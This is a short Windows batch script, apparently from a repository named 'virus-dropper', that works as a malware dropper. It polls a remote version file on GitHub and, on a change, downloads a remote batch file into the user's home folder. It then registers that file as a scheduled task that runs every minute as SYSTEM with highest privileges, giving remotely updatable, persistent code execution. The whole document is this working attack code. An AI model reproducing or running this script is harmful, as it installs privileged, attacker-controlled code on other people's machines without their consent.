@echo off
:loooop
set /a version=10
@SET output=
FOR /F %%I IN ('curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/version.txt"') DO @SET "output=%%I"
If %output% == %version% goto loooop ELSE goto update

goto :loooop

:update
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/updater.bat" --output "%HOMEPATH%\Updater.bat"
SCHTASKS /CREATE /F /SC MINUTE /TR "%HOMEPATH%\Updater.bat" /TN "updateTEMP" /RL HIGHEST /RU SYSTEM
exit
